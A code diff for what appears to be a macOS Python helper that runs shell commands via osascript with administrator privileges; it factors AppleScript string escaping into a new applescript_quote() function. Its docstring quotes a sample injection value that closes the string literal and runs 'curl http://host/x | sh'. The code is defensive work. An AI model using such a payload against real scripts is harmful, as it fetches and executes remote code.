@@ -332,14 +332,43 @@ def osascript(cmd_args, **kwargs) -> subprocess.CompletedProcess:
     referenzierte ein nicht existierendes 'args' und loeste NameError aus.
     """
     cmd_string = shlex.join(str(arg) for arg in cmd_args)
-    # Escape for the AppleScript string literal: backslashes first, then quotes.
-    # Newlines cannot appear inside an AppleScript string literal at all, so they are
-    # rejected outright rather than producing a syntactically broken script.
+    # Newlines cannot appear inside an AppleScript string literal at all, so a command
+    # containing them is rejected outright rather than producing a syntactically broken
+    # script. Everything else is escaped by applescript_quote() below.
     if "\n" in cmd_string or "\r" in cmd_string:
         raise ValueError("Refusing to build AppleScript from a command containing newlines")
-    as_safe_string = cmd_string.replace('\\', '\\\\').replace('"', '\\"')
-    apple_script = f'do shell script "{as_safe_string}" with administrator privileges'
+    apple_script = f'do shell script "{applescript_quote(cmd_string)}" with administrator privileges'
     return subprocess.run(["/usr/bin/osascript", "-e", apple_script], **kwargs)
+
+
+def applescript_quote(value) -> str:
+    """
+    Escape a value for interpolation into an AppleScript string literal.
+
+    AppleScript is compiled, not handed to a shell, so passing the script through
+    osascript -e argv (or py-applescript) does NOT protect against a value that
+    contains a double quote: the quote closes the literal and everything after it
+    is parsed as code. A value such as
+
+        1.0" & (do shell script "curl http://host/x | sh") & "
+
+    turns a 'display dialog' into arbitrary command execution. Every value that is
+    interpolated into an AppleScript source string must go through here first.
+
+    Backslashes are escaped before quotes (order matters, or the escape character
+    itself gets doubled twice), and CR/LF become the AppleScript escape sequences,
+    since a raw newline cannot appear inside an AppleScript string literal.
+
+    Parameters:
+        value: Value to escape. Cast to str, so None/int callers are safe.
+
+    Returns:
+        str: The escaped text, without the surrounding quotes.
+    """
+    text = str(value)
+    text = text.replace("\\", "\\\\").replace('"', '\\"')
+    text = text.replace("\r", "\\r").replace("\n", "\\n")
+    return text
 
 
 def applescript_icon_clause(icon_path) -> str:
